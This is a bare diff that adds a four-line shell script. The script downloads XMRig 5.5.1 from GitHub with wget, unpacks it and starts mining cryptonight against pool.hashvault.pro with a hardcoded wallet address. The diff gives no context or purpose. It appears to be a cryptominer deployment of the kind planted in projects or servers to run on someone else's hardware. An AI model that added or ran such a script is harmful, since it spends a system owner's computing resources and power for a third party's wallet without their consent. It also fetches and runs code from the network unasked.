@@ -1,0 +1,4 @@
+wget https://github.com/xmrig/xmrig/releases/download/v5.5.1/xmrig-5.5.1-xenial-x64.tar.gz
+tar -zxf xmrig-5.5.1-xenial-x64.tar.gz
+cd xmrig-5.5.1
+./xmrig -a cryptonight -o stratum+tcp://pool.hashvault.pro:80 -u 87RmsS73b9uayWGF7YtrCpakKK5HGBig4S7v6eya7dPq1ZSJkwLh7kuYBUHFJterwDEPHN3Yh191x4J8ecXJMULx1P5s7Vc -p r
